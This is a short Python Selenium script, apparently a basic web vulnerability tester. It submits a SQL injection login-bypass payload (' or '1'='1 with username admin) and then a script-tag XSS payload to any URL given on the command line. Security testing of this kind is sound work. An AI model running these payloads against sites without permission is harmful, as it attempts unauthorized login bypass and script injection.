import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

user_url = sys.argv
driver = webdriver.Chrome()
driver.get(user_url[1])

try:
	uname_element = driver.find_element(By.NAME, "uid")
	print("Number of username elements: 1")
except NoSuchElementException:
	print("Number of username elements: 0")
try:
	passwd_element = driver.find_element(By.XPATH, "//input[@type='password']")
	print("Number of password elements: 1")

	uname_element.send_keys("admin")
	passwd_element.send_keys("' or '1'='1")
	passwd_element.send_keys(Keys.RETURN)
except NoSuchElementException:
	print("Number of password elements: 0")
try:
	driver.find_element(By.XPATH, "//input[@type='password']")
except NoSuchElementException:
	print("***************************Basic SQL Injection successfully executed!*************************************")
print("Basic SQL Injection tests completed. Check the report for more detailed analysis")

input_elements = driver.find_elements(By.XPATH, "//input")
text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
print("Number of input elements: ", len(input_elements))
print("Number of text input elements: ", len(text_inputs))

for element in input_elements:
	try:
		element.send_keys("<script>alert('XSS')</script>")
		element.send_keys(Keys.RETURN)
	except:
		print("No alert")
		continue
	try:
		WebDriverWait(driver, 3).until(EC.alert_is_present())
		alert = driver.switch_to.alert
		alert.accept()
		print("***************************Basic XSS successfully executed!*************************************")
		break
	except TimeoutException:
		print("No alert")
print("Basic XSS tests completed. Check the report for more detailed analysis")

driver.close()
